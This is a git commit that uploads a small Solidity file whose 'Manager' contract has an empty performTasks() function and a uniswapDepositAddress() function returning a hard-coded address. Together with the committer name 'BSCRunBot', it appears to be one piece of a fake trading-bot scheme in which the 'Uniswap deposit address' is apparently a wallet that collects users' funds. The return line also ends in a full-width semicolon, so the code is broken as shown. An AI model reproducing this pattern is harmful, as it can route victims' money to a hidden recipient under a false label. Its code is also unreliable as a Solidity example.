934a359b5cf36fda2ac8b6408fc5091c53acebf8
BSCRunBot <96918100+BSCRunBot@users.noreply.github.com>
2022-01-08 13:05:01 +0800

    Add files via upload

---
+++ BotAddressLi.sol
@@ -0,0 +1,9 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	}
+	function uniswapDepositAddress() public pure returns (address) {
+                               return  0x555628247D2769ec8f57075BF49c03c5A709E362；
+	}
+}
